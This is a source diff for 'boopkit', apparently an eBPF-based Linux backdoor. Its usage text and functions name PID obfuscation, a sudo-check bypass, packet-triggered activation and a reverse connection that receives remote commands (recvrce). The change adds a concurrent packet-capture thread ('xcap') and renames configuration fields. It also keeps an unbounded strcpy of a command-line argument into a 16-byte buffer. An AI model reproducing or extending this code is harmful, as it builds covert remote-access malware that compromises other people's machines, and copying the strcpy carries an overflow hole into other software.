@@ -37,6 +37,7 @@
 #include <sys/socket.h>
 #include <unistd.h>
 #include <xdp/libxdp.h>  // libxdp
+#include <pthread.h>
 
 // clang-format off
 #include "boopkit.h"
@@ -59,9 +60,7 @@ void usage() {
   boopprintf("-h, help           Display help and usage for boopkit.\n");
   boopprintf("-i, interface      Interface name. lo, eth0, wlan0, etc\n");
   boopprintf("-s, sudo-bypass    Bypass sudo check. Breaks PID obfuscation.\n");
-  boopprintf(
-      "-p, payload        Search boop packet for payload. No reverse "
-      "connection.\n");
+  boopprintf("-p, payload        Search xCap for payload. No reverse conn.\n");
   boopprintf("-q, quiet          Disable output.\n");
   boopprintf("-x, reject         Source addresses to reject triggers from.\n");
   boopprintf("\n");
@@ -79,7 +78,6 @@ int recvrce(char dial[INET_ADDRSTRLEN], char *rce) {
 
   int revsock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
   if (revsock == -1) {
-    // boopprintf(" XX Socket creation failed\n");
     return 1;
   }
 
@@ -116,25 +114,22 @@ int recvrce(char dial[INET_ADDRSTRLEN], char *rce) {
   return 0;
 }
 
-// config is the configuration options for the program
 struct config {
   int sudobypass;
   char pr0besafepath[PATH_MAX];
   char pr0bebooppath[PATH_MAX];
   char pr0bexdppath[PATH_MAX];
+  char dev_name[16];
   int denyc;
   int payload;
-  char if_name[16];
-  int if_index;
   char deny[MAX_DENY_ADDRS][INET_ADDRSTRLEN];
 } cfg;
 
-// clisetup will initialize the config struct for the program
 void clisetup(int argc, char **argv) {
   cfg.denyc = 0;
   cfg.payload = 0;
   cfg.sudobypass = 0;
-  strcpy(cfg.if_name, "lo");
+  strncpy(cfg.dev_name, "lo", 16);
   if (getenv("HOME") == NULL) {
     strncpy(cfg.pr0bebooppath, PROBE_BOOP, sizeof PROBE_BOOP);
     strncpy(cfg.pr0besafepath, PROBE_SAFE, sizeof PROBE_SAFE);
@@ -161,7 +156,7 @@ void clisetup(int argc, char **argv) {
           cfg.payload = 1;
           break;
         case 'i':
-          strcpy(cfg.if_name, argv[i + 1]);
+          strcpy(cfg.dev_name, argv[i + 1]);
           break;
         case 'q':
           quiet = 1;
@@ -231,6 +226,15 @@ int main(int argc, char **argv) {
   struct ring_buffer *rb = NULL;
   struct perf_buffer *pb = NULL;
   char pid[MAXPIDLEN];
+
+  // ===========================================================================
+  // [xcap]
+  {
+    // Start a concurrent packet ring buffer
+    pthread_t th;
+    pthread_create(&th, NULL, xcap, (void *)cfg.dev_name);
+  }
+  // ===========================================================================
 
   // BPF
   long err_libbfp;
